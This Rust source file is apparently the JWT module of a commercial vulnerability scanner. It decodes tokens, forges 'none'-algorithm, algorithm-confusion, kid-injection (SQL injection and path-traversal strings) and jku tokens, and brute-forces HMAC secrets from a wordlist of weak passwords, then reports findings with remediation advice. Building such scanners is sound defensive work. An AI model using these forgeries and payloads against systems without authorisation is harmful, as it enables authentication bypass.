// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

//! Advanced JWT Security Analyzer
//!
//! Deep analysis of JWT tokens including:
//! - Claim analysis and sensitive data detection
//! - Algorithm attacks (none, confusion, weak)
//! - Header injection (kid, jku, x5u)
//! - Secret brute-forcing with wordlist

use crate::http_client::HttpClient;
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
use anyhow::Result;
use base64::{engine::general_purpose::URL_SAFE_NO_PAD, Engine};
use serde_json::Value;
use std::sync::Arc;
use tracing::{debug, info, warn};

/// Common weak JWT secrets to test
const WEAK_SECRETS: &[&str] = &[
    "secret", "password", "123456", "key", "private", "jwt_secret",
    "your-256-bit-secret", "your-secret-key", "mysecretkey", "changeme",
    "supersecret", "jwt", "token", "auth", "api_secret", "secret123",
    "password123", "admin", "root", "test", "development", "staging",
    "production", "default", "example", "demo", "sample", "qwerty",
    "letmein", "welcome", "monkey", "dragon", "master", "login",
    "abc123", "111111", "passw0rd", "trustno1", "654321", "superman",
    "qazwsx", "michael", "football", "iloveyou", "access", "shadow",
    "ashley", "fuckme", "696969", "123123", "baseball", "mustang",
    "pussy", "master123", "killer", "jordan", "jennifer", "hunter",
    "buster", "soccer", "harley", "batman", "andrew", "tigger",
    "sunshine", "charlie", "robert", "thomas", "hockey", "ranger",
    "daniel", "starwars", "klaster", "112233", "george", "asshole",
    "computer", "corvette", "hammer", "love", "whatever", "maverick",
    "ginger", "sparky", "fender", "freedom", "merlin", "secret1",
    "gfhjkm", "shithead", "morgan", "biteme", "qwertyuiop", "12345678",
    // Common in tutorials/examples
    "your_jwt_secret", "your-jwt-secret", "jwt-secret", "jwt_secret_key",
    "my-secret-key", "my_secret_key", "app_secret", "app-secret",
    "secret_key", "secret-key", "api_key", "api-key", "auth_secret",
    "token_secret", "session_secret", "cookie_secret", "encryption_key",
    // Framework defaults
    "AllYourBase", "change_me", "secret_key_base", "devise_secret",
    "HS256-secret", "RS256-secret", "ES256-secret", "none",
];

/// Sensitive claim patterns that indicate data exposure
const SENSITIVE_CLAIM_PATTERNS: &[&str] = &[
    "email", "mail", "password", "pass", "pwd", "secret", "token",
    "key", "api", "credit", "card", "ssn", "social", "phone", "mobile",
    "address", "street", "zip", "postal", "dob", "birth", "age",
    "salary", "income", "bank", "account", "routing", "iban", "swift",
    "private", "internal", "admin", "role", "permission", "privilege",
    "group", "department", "employee", "staff", "user_id", "customer_id",
];

/// Decoded JWT structure
#[derive(Debug, Clone)]
pub struct DecodedJwt {
    pub header: Value,
    pub payload: Value,
    pub signature: String,
    pub raw_token: String,
}

impl DecodedJwt {
    /// Decode a JWT without verification
    pub fn decode(token: &str) -> Option<Self> {
        let parts: Vec<&str> = token.split('.').collect();
        if parts.len() != 3 {
            return None;
        }

        let header = URL_SAFE_NO_PAD.decode(parts[0]).ok()?;
        let payload = URL_SAFE_NO_PAD.decode(parts[1]).ok()?;

        let header: Value = serde_json::from_slice(&header).ok()?;
        let payload: Value = serde_json::from_slice(&payload).ok()?;

        Some(Self {
            header,
            payload,
            signature: parts[2].to_string(),
            raw_token: token.to_string(),
        })
    }

    /// Get the algorithm from header
    pub fn algorithm(&self) -> Option<&str> {
        self.header.get("alg").and_then(|v| v.as_str())
    }

    /// Get kid (key ID) from header
    pub fn kid(&self) -> Option<&str> {
        self.header.get("kid").and_then(|v| v.as_str())
    }

    /// Get jku (JWK Set URL) from header
    pub fn jku(&self) -> Option<&str> {
        self.header.get("jku").and_then(|v| v.as_str())
    }

    /// Get x5u (X.509 URL) from header
    #[allow(dead_code)]
    pub fn x5u(&self) -> Option<&str> {
        self.header.get("x5u").and_then(|v| v.as_str())
    }

    /// Find sensitive data in claims
    pub fn find_sensitive_claims(&self) -> Vec<SensitiveClaim> {
        let mut findings = Vec::new();

        if let Some(obj) = self.payload.as_object() {
            for (key, value) in obj {
                let key_lower = key.to_lowercase();
                for pattern in SENSITIVE_CLAIM_PATTERNS {
                    if key_lower.contains(pattern) {
                        findings.push(SensitiveClaim {
                            key: key.clone(),
                            value: value.clone(),
                            pattern: pattern.to_string(),
                            severity: Self::classify_sensitivity(pattern),
                        });
                        break;
                    }
                }

                // Check for base64-encoded data that might be sensitive
                if let Some(s) = value.as_str() {
                    if s.len() > 20 && Self::looks_like_base64(s) {
                        findings.push(SensitiveClaim {
                            key: key.clone(),
                            value: value.clone(),
                            pattern: "base64_encoded".to_string(),
                            severity: Severity::Low,
                        });
                    }
                }
            }
        }

        findings
    }

    fn classify_sensitivity(pattern: &str) -> Severity {
        match pattern {
            "password" | "pass" | "pwd" | "secret" | "key" | "credit" | "card" | "ssn" => Severity::Critical,
            "email" | "phone" | "mobile" | "bank" | "account" | "private" => Severity::High,
            "admin" | "role" | "permission" | "privilege" => Severity::Medium,
            _ => Severity::Low,
        }
    }

    fn looks_like_base64(s: &str) -> bool {
        s.chars().all(|c| c.is_alphanumeric() || c == '+' || c == '/' || c == '=')
            && s.len() % 4 == 0
    }

    /// Create a token with "none" algorithm
    pub fn create_none_algorithm_token(&self) -> String {
        let header = r#"{"alg":"none","typ":"JWT"}"#;
        let header_b64 = URL_SAFE_NO_PAD.encode(header);

        let payload_str = serde_json::to_string(&self.payload).unwrap_or_default();
        let payload_b64 = URL_SAFE_NO_PAD.encode(&payload_str);

        format!("{}.{}.", header_b64, payload_b64)
    }

    /// Create a token with algorithm confusion (RS256 -> HS256)
    #[allow(dead_code)]
    pub fn create_algorithm_confusion_token(&self, public_key: &str) -> String {
        let header = r#"{"alg":"HS256","typ":"JWT"}"#;
        let header_b64 = URL_SAFE_NO_PAD.encode(header);

        let payload_str = serde_json::to_string(&self.payload).unwrap_or_default();
        let payload_b64 = URL_SAFE_NO_PAD.encode(&payload_str);

        // Sign with public key as HMAC secret (algorithm confusion attack)
        let message = format!("{}.{}", header_b64, payload_b64);
        let signature = Self::hmac_sign(&message, public_key.as_bytes());

        format!("{}.{}.{}", header_b64, payload_b64, signature)
    }

    /// Create token with kid injection payload
    pub fn create_kid_injection_token(&self, injection: &str) -> String {
        let header = serde_json::json!({
            "alg": "HS256",
            "typ": "JWT",
            "kid": injection
        });
        let header_b64 = URL_SAFE_NO_PAD.encode(serde_json::to_string(&header).unwrap());

        let payload_str = serde_json::to_string(&self.payload).unwrap_or_default();
        let payload_b64 = URL_SAFE_NO_PAD.encode(&payload_str);

        // For SQLi kid, sign with empty or known secret
        let message = format!("{}.{}", header_b64, payload_b64);
        let signature = Self::hmac_sign(&message, b"");

        format!("{}.{}.{}", header_b64, payload_b64, signature)
    }

    /// Create token with jku pointing to attacker URL
    #[allow(dead_code)]
    pub fn create_jku_injection_token(&self, attacker_url: &str) -> String {
        let header = serde_json::json!({
            "alg": "RS256",
            "typ": "JWT",
            "jku": attacker_url
        });
        let header_b64 = URL_SAFE_NO_PAD.encode(serde_json::to_string(&header).unwrap());

        let payload_str = serde_json::to_string(&self.payload).unwrap_or_default();
        let payload_b64 = URL_SAFE_NO_PAD.encode(&payload_str);

        // Invalid signature - if server fetches our JKU, we control the key
        format!("{}.{}.fake_signature", header_b64, payload_b64)
    }

    fn hmac_sign(message: &str, secret: &[u8]) -> String {
        use hmac::{Hmac, Mac};
        use sha2::Sha256;

        type HmacSha256 = Hmac<Sha256>;

        let mut mac = HmacSha256::new_from_slice(secret).unwrap();
        mac.update(message.as_bytes());
        let result = mac.finalize();

        URL_SAFE_NO_PAD.encode(result.into_bytes())
    }

    /// Try to crack the JWT secret
    pub fn try_crack_secret(&self) -> Option<String> {
        if self.algorithm() != Some("HS256") && self.algorithm() != Some("HS384") && self.algorithm() != Some("HS512") {
            return None;
        }

        let parts: Vec<&str> = self.raw_token.split('.').collect();
        if parts.len() != 3 {
            return None;
        }

        let message = format!("{}.{}", parts[0], parts[1]);
        let original_sig = parts[2];

        for secret in WEAK_SECRETS {
            let test_sig = Self::hmac_sign(&message, secret.as_bytes());
            if test_sig == original_sig {
                return Some(secret.to_string());
            }
        }

        None
    }
}

/// Sensitive claim found in JWT
#[derive(Debug, Clone)]
pub struct SensitiveClaim {
    pub key: String,
    pub value: Value,
    pub pattern: String,
    pub severity: Severity,
}

/// Advanced JWT Security Scanner
pub struct JwtAnalyzer {
    http_client: Arc<HttpClient>,
}

impl JwtAnalyzer {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        Self { http_client }
    }

    /// Comprehensive JWT security analysis
    pub async fn analyze(
        &self,
        url: &str,
        token: &str,
        _config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        info!("[JWT] Starting deep analysis");

        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        // Decode the token
        let jwt = match DecodedJwt::decode(token) {
            Some(j) => j,
            None => {
                warn!("[JWT] Failed to decode token - invalid format");
                return Ok((vulnerabilities, 1));
            }
        };

        info!("[JWT] Token decoded - Algorithm: {:?}", jwt.algorithm());

        // 1. Analyze claims for sensitive data
        tests_run += 1;
        let sensitive = jwt.find_sensitive_claims();
        if !sensitive.is_empty() {
            info!("[JWT] Found {} sensitive claims", sensitive.len());
            for claim in &sensitive {
                vulnerabilities.push(Vulnerability {
                    id: format!("jwt-sensitive-{}", uuid::Uuid::new_v4()),
                    vuln_type: "Sensitive Data in JWT Claims".to_string(),
                    severity: claim.severity.clone(),
                    confidence: Confidence::High,
                    category: "Information Disclosure".to_string(),
                    url: url.to_string(),
                    parameter: Some(format!("JWT claim: {}", claim.key)),
                    payload: "N/A".to_string(),
                    description: format!(
                        "JWT contains sensitive data in claim '{}' (matched pattern: '{}'). Value type: {}",
                        claim.key,
                        claim.pattern,
                        if claim.value.is_string() { "string" } else { "other" }
                    ),
                    evidence: Some(format!("Claim '{}' contains potentially sensitive data", claim.key)),
                    cwe: "CWE-200".to_string(),
                    cvss: 6.5,
                    verified: true,
                    false_positive: false,
                    remediation: "Remove sensitive data from JWT claims or encrypt the token payload. Use opaque tokens for sensitive operations.".to_string(),
                    discovered_at: chrono::Utc::now().to_rfc3339(),
                ml_data: None,
                });
            }
        }

        // 2. Test none algorithm
        tests_run += 1;
        let none_token = jwt.create_none_algorithm_token();
        if let Ok(response) = self.test_token(url, &none_token).await {
            if self.is_authenticated_response(&response.body, response.status_code) {
                vulnerabilities.push(Vulnerability {
                    id: format!("jwt-none-{}", uuid::Uuid::new_v4()),
                    vuln_type: "JWT None Algorithm Accepted".to_string(),
                    severity: Severity::Critical,
                    confidence: Confidence::High,
                    category: "Authentication Bypass".to_string(),
                    url: url.to_string(),
                    parameter: Some("Authorization header".to_string()),
                    payload: none_token[..50.min(none_token.len())].to_string(),
                    description: "Server accepts JWT tokens with 'none' algorithm, allowing signature bypass".to_string(),
                    evidence: Some(format!("Token with none algorithm accepted: {}...", &none_token[..50.min(none_token.len())])),
                    cwe: "CWE-347".to_string(),
                    cvss: 9.8,
                    verified: true,
                    false_positive: false,
                    remediation: "Reject tokens with 'none' algorithm. Whitelist allowed algorithms and never accept unsigned tokens.".to_string(),
                    discovered_at: chrono::Utc::now().to_rfc3339(),
                ml_data: None,
                });
            }
        }

        // 3. Test weak secrets
        tests_run += 1;
        if let Some(cracked_secret) = jwt.try_crack_secret() {
            vulnerabilities.push(Vulnerability {
                id: format!("jwt-weak-{}", uuid::Uuid::new_v4()),
                vuln_type: "JWT Weak Secret".to_string(),
                severity: Severity::Critical,
                confidence: Confidence::High,
                category: "Cryptographic Issues".to_string(),
                url: url.to_string(),
                parameter: Some("JWT secret".to_string()),
                payload: cracked_secret.clone(),
                description: format!("JWT secret is weak and easily guessable: '{}'", cracked_secret),
                evidence: Some(format!("Secret cracked from wordlist: {}", cracked_secret)),
                cwe: "CWE-521".to_string(),
                cvss: 9.1,
                verified: true,
                false_positive: false,
                remediation: "Use a cryptographically strong random secret of at least 256 bits. Generate secrets using a secure random number generator.".to_string(),
                discovered_at: chrono::Utc::now().to_rfc3339(),
                ml_data: None,
            });
        }

        // 4. Test kid SQL injection
        tests_run += 1;
        let kid_sqli_payloads = vec![
            "' OR '1'='1",
            "' UNION SELECT 'secret' --",
            "../../../../../../dev/null",
            "/dev/null",
            "key.pem",
        ];

        for payload in kid_sqli_payloads {
            let kid_token = jwt.create_kid_injection_token(payload);
            if let Ok(response) = self.test_token(url, &kid_token).await {
                if self.is_authenticated_response(&response.body, response.status_code) {
                    vulnerabilities.push(Vulnerability {
                        id: format!("jwt-kid-{}", uuid::Uuid::new_v4()),
                        vuln_type: "JWT kid Parameter Injection".to_string(),
                        severity: Severity::Critical,
                        confidence: Confidence::Medium,
                        category: "Injection".to_string(),
                        url: url.to_string(),
                        parameter: Some("JWT kid header".to_string()),
                        payload: payload.to_string(),
                        description: format!("JWT kid parameter vulnerable to injection: {}", payload),
                        evidence: Some(format!("Payload accepted: {}", payload)),
                        cwe: "CWE-89".to_string(),
                        cvss: 9.8,
                        verified: true,
                        false_positive: false,
                        remediation: "Validate and sanitize the kid parameter. Use UUID-based key IDs instead of arbitrary strings.".to_string(),
                        discovered_at: chrono::Utc::now().to_rfc3339(),
                ml_data: None,
                    });
                    break;
                }
            }
        }

        // 5. Test jku injection
        tests_run += 1;
        if jwt.jku().is_some() || jwt.algorithm().map(|a| a.starts_with("RS") || a.starts_with("ES")).unwrap_or(false) {
            // Note: Can't fully test without actually hosting a JWKS endpoint
            // But we can check if the header is accepted
            debug!("[JWT] jku injection test - server uses asymmetric algorithm");
        }

        // 6. Check for missing expiration
        tests_run += 1;
        if jwt.payload.get("exp").is_none() {
            vulnerabilities.push(Vulnerability {
                id: format!("jwt-noexp-{}", uuid::Uuid::new_v4()),
                vuln_type: "JWT Missing Expiration".to_string(),
                severity: Severity::Medium,
                confidence: Confidence::High,
                category: "Session Management".to_string(),
                url: url.to_string(),
                parameter: Some("JWT exp claim".to_string()),
                payload: "N/A".to_string(),
                description: "JWT token has no expiration claim (exp), allowing indefinite use".to_string(),
                evidence: Some("No 'exp' claim in token payload".to_string()),
                cwe: "CWE-613".to_string(),
                cvss: 5.3,
                verified: true,
                false_positive: false,
                remediation: "Always include an expiration claim with reasonable lifetime. Use short-lived tokens (15-60 minutes) with refresh token rotation.".to_string(),
                discovered_at: chrono::Utc::now().to_rfc3339(),
                ml_data: None,
            });
        }

        // 7. Check for overly long expiration
        tests_run += 1;
        if let Some(exp) = jwt.payload.get("exp").and_then(|v| v.as_i64()) {
            let now = chrono::Utc::now().timestamp();
            let days_until_exp = (exp - now) / 86400;
            if days_until_exp > 30 {
                vulnerabilities.push(Vulnerability {
                    id: format!("jwt-longexp-{}", uuid::Uuid::new_v4()),
                    vuln_type: "JWT Excessive Expiration".to_string(),
                    severity: Severity::Low,
                    confidence: Confidence::High,
                    category: "Session Management".to_string(),
                    url: url.to_string(),
                    parameter: Some("JWT exp claim".to_string()),
                    payload: format!("exp: {} ({}+ days)", exp, days_until_exp),
                    description: format!("JWT token expires in {} days, which is excessively long", days_until_exp),
                    evidence: Some(format!("Token expires in {} days", days_until_exp)),
                    cwe: "CWE-613".to_string(),
                    cvss: 3.1,
                    verified: true,
                    false_positive: false,
                    remediation: "Use short-lived tokens (15-60 minutes) with refresh token rotation for better security.".to_string(),
                    discovered_at: chrono::Utc::now().to_rfc3339(),
                ml_data: None,
                });
            }
        }

        info!("[JWT] Analysis complete: {} tests, {} vulnerabilities", tests_run, vulnerabilities.len());
        Ok((vulnerabilities, tests_run))
    }

    async fn test_token(&self, url: &str, token: &str) -> Result<crate::http_client::HttpResponse> {
        let headers = vec![("Authorization".to_string(), format!("Bearer {}", token))];
        self.http_client.get_with_headers(url, headers).await
    }

    fn is_authenticated_response(&self, body: &str, status: u16) -> bool {
        // Success indicators
        if status == 200 || status == 201 {
            // Check for common auth success patterns
            let body_lower = body.to_lowercase();
            if body_lower.contains("welcome") ||
               body_lower.contains("dashboard") ||
               body_lower.contains("profile") ||
               body_lower.contains("\"authenticated\":true") ||
               body_lower.contains("\"success\":true") ||
               body_lower.contains("\"user\":{") {
                return true;
            }
        }

        // Failure indicators
        if status == 401 || status == 403 {
            return false;
        }

        // Ambiguous - lean towards false to avoid false positives
        false
    }
}

// UUID generation helper
mod uuid {
    use rand::Rng;

    pub struct Uuid;

    impl Uuid {
        pub fn new_v4() -> String {
            let mut rng = rand::rng();
            format!(
                "{:08x}-{:04x}-{:04x}-{:04x}-{:012x}",
                rng.random::<u32>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u64>() & 0xffffffffffff
            )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_jwt_decode() {
        let token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";

        let jwt = DecodedJwt::decode(token).unwrap();
        assert_eq!(jwt.algorithm(), Some("HS256"));
        assert_eq!(jwt.payload.get("name").and_then(|v| v.as_str()), Some("John Doe"));
    }

    #[test]
    fn test_none_algorithm_token() {
        let token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.xxx";
        let jwt = DecodedJwt::decode(token).unwrap();
        let none_token = jwt.create_none_algorithm_token();

        assert!(none_token.ends_with('.'));
        assert!(none_token.starts_with("eyJhbGciOiJub25lIi"));
    }
}
